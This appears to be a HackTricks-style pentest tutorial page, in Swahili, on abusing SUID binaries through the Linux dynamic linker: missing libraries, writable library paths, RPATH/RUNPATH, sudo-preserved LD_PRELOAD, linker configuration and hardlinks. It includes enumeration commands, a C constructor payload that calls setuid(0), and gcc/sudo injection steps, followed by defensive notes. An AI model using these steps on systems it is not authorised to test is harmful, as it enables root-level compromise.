# SUID Shared Library and Linker Abuse

SUID binaries kwa kawaida hukaguliwa kwa ajili ya direct command execution, lakini custom SUID programs pia zinaweza kuwa vulnerable kupitia dynamic linker. Dhana kuu ni rahisi: privileged executable hupakia code kutoka kwenye path au configuration ambayo lower-privileged user anaweza kuathiri.<sup>[[1]](#references)</sup>

Ukurasa huu unaangazia generic technique patterns: missing libraries, writable library directories, `RPATH`/`RUNPATH`, `LD_PRELOAD` kupitia sudo, linker configuration, na SUID hardlink confusion.

## Fast Enumeration

Anza kwa kutafuta unusual SUID files na kukagua ikiwa zimeunganishwa dynamically:<sup>[[1]](#references)[[3]](#references)</sup>
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
Zingatia maeneo yasiyo ya kawaida, njia maalum za applications, binaries zinazomilikiwa na root lakini zilizo nje ya directories zinazosimamiwa na packages, na dependencies zinazopakiwa kutoka directories zinazoweza kuandikwa.<sup>[[1]](#references)</sup>

Ukaguzi muhimu wa uwezo wa kuandika:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Missing Shared Object Injection

Baadhi ya SUID binaries maalum hujaribu kupakia shared object ambayo haipo. Ikiwa path iliyokosekana iko chini ya directory inayodhibitiwa na mshambuliaji, binary inaweza kupakia code iliyotolewa na mshambuliaji ikiwa na effective user.<sup>[[1]](#references)</sup>

Tafuta library lookups zilizoshindikana kwa kutumia syscall filter ya `strace`:<sup>[[2]](#references)</sup>
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
Ikiwa binary inatafuta `libexample.so` kwenye path inayoweza kuandikwa, proof library ndogo inaweza kutumia constructor. Weka proof-of-impact ikiwa haina madhara wakati wa uthibitishaji:<sup>[[6]](#references)</sup>
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
Iunde kwa kutumia jina kamili la faili ambalo binary inajaribu kupakia:
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
Hali inayoweza kutumiwa vibaya si library inayokosekana pekee. Mshambulizi lazima aweze kuweka shared object inayooana katika path ambayo privileged loader itakubali.<sup>[[1]](#references)</sup>

## Saraka ya Library Inayoweza Kuandikwa

Wakati mwingine dependencies zote zinapatikana, lakini mojawapo ya saraka zinazotumiwa kuzipata inaweza kuandikwa. Hii inaweza kuruhusu kubadilisha library iliyopakiwa au kuweka library yenye kipaumbele cha juu yenye jina lilelile.<sup>[[1]](#references)</sup>

Kagua paths za dependencies:<sup>[[1]](#references)[[3]](#references)</sup>
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
Ikiwa directory inaweza kuandikwa, thibitisha kwa kutumia mbinu salama ya kunakili katika lab. Kubadilisha system libraries kwenye host inayoendelea kufanya kazi kunaweza kuacha processes zinazoanza kwa wakati mmoja zikiwa na library versions zisizolingana.<sup>[[8]](#references)</sup>

## RPATH and RUNPATH

`RPATH` na `RUNPATH` ni entries za dynamic-section zinazoelekeza loader mahali pa kutafuta libraries. Ni hatari katika programu za SUID zinapoelekeza kwenye directories ambazo attacker anaweza kuziandikia.<sup>[[1]](#references)</sup>

Zigundue:<sup>[[3]](#references)[[10]](#references)</sup>
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
Mfano wa matokeo hatari:
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
Ikiwa `/opt/app/lib` inaweza kuandikwa na binary inahitaji `libcustom.so`, mshambulizi anaweza kuweka `libcustom.so` hasidi hapo:<sup>[[1]](#references)</sup>
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH` na `RUNPATH` si sawa katika maelezo yote ya utatuzi, lakini kwa ukaguzi wa privilege-escalation swali la kivitendo ni lilelile: je, binary ya SUID hutafuta library name kwenye directory inayoweza kuandikwa na attacker?<sup>[[1]](#references)</sup>

## LD_PRELOAD, LD_LIBRARY_PATH and SUID

Kwa programs za kawaida, `LD_PRELOAD` na `LD_LIBRARY_PATH` zinaweza kulazimisha au kuathiri upakiaji wa shared object. Kwa programs za SUID, dynamic loader kwa kawaida huingia katika secure-execution mode na kupuuza environment variables hatari.<sup>[[1]](#references)</sup>

Hii inamaanisha kuwa binary ya kawaida ya SUID kwa kawaida si vulnerable kwa sababu tu user anaweza kuweka `LD_PRELOAD`:<sup>[[1]](#references)</sup>
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
Isipokuwa cha kawaida ni sudo policy inayoruhusu kuweka au kuhifadhi loader variables kwa command inayolengwa. Kagua `sudo -l` kwa entries kama `env_keep+=LD_PRELOAD` au `env_keep+=LD_LIBRARY_PATH`; ikiwa target imeunganishwa dynamically, inaweza kupakia code inayodhibitiwa na attacker:<sup>[[4]](#references)[[5]](#references)</sup>
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
Usichanganye hali hizi; loader na sudo policy rules zilizo hapo juu zinazitofautisha:<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

- `LD_PRELOAD` dhidi ya SUID binary ya kawaida: kwa kawaida huzuiwa na secure execution.
- `LD_PRELOAD` iliyohifadhiwa na sudo: inaweza kutumiwa kwa exploit.
- `.so` iliyokosekana kwenye writable path: inaweza kutumiwa kwa exploit wakati SUID binary inapakia path hiyo kwa kawaida.
- `RPATH`/`RUNPATH` inayoelekeza kwenye writable directory: inaweza kutumiwa kwa exploit wakati library inayohitajika inaweza kudhibitiwa.
- `/etc/ld.so.preload` au write access ya linker config: inaathiri mfumo mzima na ina impact kubwa.

## Linker Configuration

`ld.so` hutumia linker cache na `/etc/ld.so.preload`; `ldconfig` huunda cache hiyo kutoka `/etc/ld.so.conf` na files zinazoingizwa kutoka humo, kwa kawaida `/etc/ld.so.conf.d/`.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

Ukaguzi wa thamani kubwa:
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
Writable linker configuration kwa kawaida ni tatizo kubwa zaidi kuliko SUID binary moja iliyo hatarini, kwa sababu inaweza kuathiri michakato mingi inayolink dynamically. `/etc/ld.so.preload` ni hatari hasa kwa sababu inaweza kulazimisha shared object kupakiwa ndani ya michakato yenye privileged permissions.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

## SUID Hardlink Confusion

Hardlinks zinaweza kufanya SUID inode ileile ionekane chini ya majina mengi.<sup>[[9]](#references)</sup> Hii ni muhimu kwa kuficha privileged helper, kuchanganya cleanup, au kukwepa ukaguzi wa kawaida unaotegemea path.

Tafuta SUID files zenye links zaidi ya moja:<sup>[[9]](#references)</sup>
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
Kagua njia zote zinazoelekeza kwenye inode ileile:<sup>[[9]](#references)</sup>
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
Matumizi mabaya si kwamba hardlink hubadilisha permissions. Matumizi mabaya ni path confusion: inode yenye privileges inaweza kufikiwa kupitia jina ambalo defenders au scripts hawatarajii.<sup>[[9]](#references)</sup> Kwa maelezo ya kina kuhusu inode na hardlink workflow, tazama [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md).

## Defensive Notes

- Weka SUID binaries ziwe chache, zikaguliwe, na zidhibitiwe na package inapowezekana.
- Epuka entries za `RPATH`/`RUNPATH` zinazoelekeza kwenye directories zinazoweza kuandikwa au zinazosimamiwa na application.<sup>[[1]](#references)[[8]](#references)</sup>
- Weka library directories ziwe za root na zisiweze kuandikwa na regular users.<sup>[[8]](#references)</sup>
- Usihifadhi `LD_PRELOAD`, `LD_LIBRARY_PATH`, au loader variables zinazofanana kupitia sudo.<sup>[[1]](#references)[[5]](#references)</sup>
- Fuatilia `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, na SUID files zisizotarajiwa.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>
- Kagua SUID files zilizounganishwa kwa hardlink na chunguza SUID wrappers maalum zilizo nje ya standard system paths.<sup>[[9]](#references)</sup>

## References

- [1] [ld.so(8) — ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [strace(1) — ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man1/strace.1.html)
- [3] [readelf (GNU Binary Utilities)](https://sourceware.org/binutils/docs/binutils/readelf.html)
- [4] [sudo(8) — ukurasa wa mwongozo wa Linux](https://www.man7.org/linux/man-pages/man8/sudo.8.html)
- [5] [sudoers(5) — ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [6] [Common Attributes (GCC)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [7] [ldconfig(8) — ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [8] [Dynamic Linker Hardening (The GNU C Library)](https://www.sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [9] [Hard Links (GNU Findutils)](https://www.gnu.org/software/findutils/manual/html_node/find_html/Hard-Links.html)
- [10] [objdump (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/objdump.html)
{{#include ../../banners/hacktricks-training.md}}
